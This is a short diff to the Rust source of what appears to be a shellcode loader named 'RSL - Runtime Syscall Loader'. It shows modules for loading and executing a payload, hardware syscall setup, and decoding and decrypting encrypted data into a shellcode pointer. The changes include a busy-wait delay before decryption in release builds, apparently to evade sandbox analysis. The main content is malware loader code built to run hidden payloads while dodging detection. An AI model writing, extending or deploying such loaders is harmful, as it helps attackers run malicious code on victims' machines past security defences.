@@ -1,4 +1,4 @@
-#![cfg_attr(not(feature = "debug"), windows_subsystem = "windows")]
+//#![cfg_attr(not(feature = "debug"), windows_subsystem = "windows")]
 mod utils;
 mod load_payload;
 mod exec;
@@ -31,6 +31,8 @@ fn exit_program() -> ! {
 }
 
 fn start_program() {
+    println!("RSL - Runtime Syscall Loader");
+
     #[cfg(feature = "hw_syscall")]
     unsafe {
         syscall::hw_syscall::init_hw_syscalls();
@@ -78,6 +80,9 @@ fn main() {
     };
 
     let decrypted_data = decode_payload(&encrypted_data).unwrap();
+
+    #[cfg(not(feature = "debug"))]
+    for _ in 0..1000000 { core::hint::spin_loop(); }
 
     unsafe {
         let (shellcode_ptr, shellcode_len) = match decrypt(&decrypted_data) {
